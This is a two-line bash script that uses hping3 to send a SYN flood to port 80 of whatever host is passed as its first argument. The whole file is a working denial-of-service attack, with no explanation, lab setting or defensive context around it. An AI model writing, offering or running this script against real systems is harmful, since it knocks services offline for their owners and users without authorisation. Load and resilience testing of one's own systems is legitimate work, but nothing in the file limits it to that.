#!/bin/bash
sudo hping3 --syn --flood -p 80 "$1"
